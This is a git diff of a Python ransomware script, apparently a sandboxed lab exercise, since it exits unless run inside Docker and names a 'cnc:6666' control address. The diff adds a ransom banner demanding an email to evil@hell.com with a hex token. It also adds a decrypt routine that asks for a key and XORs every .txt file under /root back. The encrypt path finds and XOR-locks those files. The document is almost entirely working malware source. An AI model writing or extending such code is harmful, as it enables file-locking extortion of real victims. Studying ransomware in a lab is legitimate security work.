@@ -5,24 +5,34 @@ import sys
 from pathlib import Path
 from secret_manager import SecretManager
 
+import base64
+
 
 CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
 
-ENCRYPT_MESSAGE = "Your txt files have been locked. Send an email to evil@hell.com with title '{ransomware._token}' to unlock your data."
 
-#"""
-#  _____                                                                                           
-# |  __ \                                                                                          
-# | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
-# |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
-# | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
-# |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
-#                | |                      __/ |                                               __/ |
-#                |_|                     |___/                                               |___/ 
-#
-#Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
-#"""
+# fency message
+def display_message(_token_:str)->None: 
+    ENCRYPT_MESSAGE = f"""\n
+#####################################################################################################
+#  _____                                                                                            #
+# |  __ \\                                                                                           #
+# | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _  #
+# |  ___/ '__/ _ \\ '_ \\ / _` | '__/ _ \\ | | | |/ _ \\| | | | '__| | '_ ` _ \\ / _ \\| '_ \\ / _ \\ | | | #
+# | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| | #
+# |_|   |_|  \\___| .__/ \\__,_|_|  \\___|  \\__, |\\___/ \\__,_|_|    |_| |_| |_|\\___/|_| |_|\\___|\\__, | #
+#                | |                      __/ |                                               __/ | #
+#                |_|                     |___/                                               |___/  #
+#                                                                                                   #
+#####################################################################################################
+Your txt files have been locked. Send an email to evil@hell.com with title '{_token_}' to unlock your data.
+\n"""
+    print(ENCRYPT_MESSAGE)
+    return None
+
+
+
 
 class Ransomware:
     def __init__(self) -> None:
@@ -37,29 +47,58 @@ class Ransomware:
             print(f"You must run the malware in docker ({hostname}) !")
             sys.exit(1)
 
+
     def get_files(self, filter:str)->list:
         # main function for finding all .txt file to encrypt/decrypt
         lfiles = sorted(Path('/root').rglob(filter)) #read all path
         print(lfiles)
         return lfiles
 
+
     def encrypt(self):
         # main function for encrypting
+        
         # Listing txt files
         lfile = self.get_files('*.txt')
         # Secret Manager
         mySecret = SecretManager()
-        mySecret.create()
         mySecret.setup()
         # file encryption
         mySecret.xorfiles(lfile)
         # display message on target machine
-        print(ENCRYPT_MESSAGE)
+        display_message(mySecret.get_hex_token())
+        
         return
+        
+
 
     def decrypt(self):
         # main function for decrypting
-        raise NotImplemented()
+
+        # Secret Manager
+        mySecret = SecretManager()
+        # loading current secrets (salt+token)
+        mySecret.load()
+        # asking for the key: loop
+        while True:
+            #try:
+                tiped_key = input("Enter the key:")
+                #b64_tiped_key = base64.b64encode(tiped_key, 'utf8')
+                mySecret.set_key(bytes(tiped_key, 'utf8'))
+                break
+            #except:
+                #print("Wrong key, try again...")
+        
+        # Listing txt files
+        lfile = self.get_files('*.txt')
+        # file decryption
+        mySecret.xorfiles(lfile)
+        # cleaning
+        mySecret.clean()
+        # display message on target machine
+        print("NICE TO MAKE BUSINESS WITH YOU !")
+
+        return
 
 
 if __name__ == "__main__":
